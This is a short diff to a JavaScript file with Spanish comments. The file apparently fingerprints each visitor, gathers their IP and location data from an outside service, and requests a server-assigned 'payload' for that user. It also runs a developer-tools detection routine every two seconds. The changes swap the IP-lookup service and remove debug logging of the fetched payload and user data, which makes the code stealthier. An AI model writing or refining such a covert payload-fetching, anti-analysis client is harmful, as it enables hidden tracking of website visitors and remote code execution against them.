@@ -72,7 +72,7 @@ async function get_uuid_m() {
     }
 
     try {
-        const ip_ = await fetch("http://ip-api.com/json/", {"method": "get"})
+        const ip_ = await fetch("https://api.ipapi.is/", {"method": "get"})
         uuid_m["ip_info"] = await ip_.json()
     } catch {
         uuid_m["ip_info"] = "error"
@@ -86,7 +86,7 @@ async function detectar_developer_tools() {
     
     // Se solicita un payload que si existe el usuario retornara el payload que debe de tener asignado
     const payload_charge = await solicitar_payload()
-    console.log(payload_charge)
+
     // Si contiene un payload asignado, se verifica que no sea uno que ya ejecuto anteriormente
     if (payload_charge["status"] === 200) {
 
@@ -140,7 +140,7 @@ async function detectar_developer_tools() {
 // Funcion inicial encargada de contener las funciones paralelas
 async function main() {
     USR_GB = await get_uuid_m()
-    console.log(USR_GB)
+
     setInterval(detectar_developer_tools, 2000)
 }
 
